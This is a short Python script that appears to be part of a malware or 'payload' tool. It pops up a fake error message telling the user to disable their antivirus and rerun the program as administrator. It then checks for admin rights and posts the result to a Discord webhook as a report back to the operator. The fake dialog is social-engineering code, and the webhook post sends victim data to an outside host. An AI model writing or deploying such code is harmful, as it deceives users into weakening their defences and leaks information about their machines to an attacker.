class tracker:
    isAdmin = False
def main():
    from datetime import datetime
    embeds = [
    ]
    tracker.isAdmin = isAdmin()
    messagebox()
    embeds.append({
        "title": "Payloads",
        "description": 
            f"Is admin: {tracker.isAdmin}\n",
        "footer": {"text": f"payloads@payload.snake | {datetime.now()}"}
    })
    send_webhook(embeds)


def messagebox():
    from tkinter import messagebox
    import sys
    m = messagebox.showerror(f"{__file__}","There was an error while executing __file__, please disable your antivirus and running the program as administrator.")
    if m:
        return
    else:
        return
def send_webhook(embeds):
    import requests
    data = {"username": "s.py", "embeds": embeds}
    requests.post(url="https://discord.com/api/webhooks/", json=data)

def isAdmin():
    import os, ctypes
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin
if __name__ == '__main__': main()